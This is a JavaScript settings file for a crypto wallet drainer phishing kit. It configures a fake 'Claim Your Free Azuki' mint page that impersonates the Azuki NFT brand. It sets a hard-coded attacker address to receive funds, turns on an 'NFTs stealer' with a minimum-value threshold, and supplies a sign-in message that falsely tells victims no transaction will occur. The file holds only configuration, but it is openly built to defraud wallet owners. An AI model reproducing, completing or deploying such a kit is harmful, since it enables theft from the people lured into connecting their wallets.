const receiveAddress = "0x5BCFe0f00583665f6eC0507cE390A3f3dc9bBAc4";

const collectionInfo = {
    name: "Azuki Drop",
    socialMedia: {
        discord: "https://discord.com/invite/azuki",
        twitter: "https://twitter.com/azukiofficial",
        instagram: "https://www.instagram.com/azuki/",
    },
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "Claim Your Free Azuki",
}

const claimPageInfo = {
    title: "CLAIM YOUR<br>AZUKI", // <br> is a line break
    shortDescription: "THE WORLD OF AZUKI.",
    longDescription: "A BRAND FOR THE METAVERSE, BUILT BY THE COMMUNITY.",

    claimButtonText: "CLAIM NOW",

    image: "adidas.png", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true, // Active (true) or not (false) NFTs stealer.
    minValue: 0.1, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "0x5BCFe0f00583665f6eC0507cE390A3f3dc9bBAc4" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion